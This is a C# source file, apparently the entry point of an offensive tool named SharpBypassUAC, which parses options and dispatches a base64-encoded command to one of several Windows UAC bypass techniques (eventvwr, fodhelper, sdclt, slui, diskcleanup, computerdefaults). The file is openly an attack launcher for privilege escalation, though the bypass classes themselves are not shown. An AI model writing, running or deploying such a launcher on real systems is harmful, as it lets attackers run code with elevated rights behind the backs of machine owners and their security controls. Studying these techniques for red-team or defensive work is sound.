using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using NDesk.Options;


namespace SharpBypassUAC
{
    class SharpBypassUAC
    {
        static void Main(string[] args)
        {
            //Setting the command line parameters
            string bypass = null;
            byte[] encodedCommand = null;
            bool help = false;

            var options = new OptionSet()
            {
                {"b|bypass=", "Bypass to execute: eventvwr, fodhelper,computerdefaults, sdclt, slui", v => bypass = v },
                {"e|encodedCommand=", "Base64 encoded command to execute", v => encodedCommand = Convert.FromBase64String(v) },
                { "h|?|help", "Show this help", v => help = true }
            };

            try
            {
                options.Parse(args);

                if (help || bypass == null)
                {
                    options.WriteOptionDescriptions(Console.Out);
                    System.Environment.Exit(1);
                }
                else if (encodedCommand == null)
                {
                    Console.Write("Missing encoded command to execute\n\n");
                    options.WriteOptionDescriptions(Console.Out);
                    System.Environment.Exit(1);
                }
                else if (bypass.ToLower().Equals("eventvwr"))
                {
                    EventVwr eventvwr = new EventVwr(encodedCommand);
                }
                else if (bypass.ToLower().Equals("fodhelper"))
                {
                    FodHelper fodhelper = new FodHelper(encodedCommand);
                }
                else if (bypass.ToLower().Equals("sdclt"))
                {
                    Sdclt sdclt = new Sdclt(encodedCommand);
                }
                else if (bypass.ToLower().Equals("slui"))
                {
                    Slui slui = new Slui(encodedCommand);
                }
                else if (bypass.ToLower().Equals("diskcleanup"))
                {
                    DiskCleanup diskcleanup = new DiskCleanup(encodedCommand);
                }
                else if (bypass.ToLower().Equals("computerdefaults"))
                {
                    ComputerDefaults computerdefaults = new ComputerDefaults(encodedCommand);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }

        }
    }
}
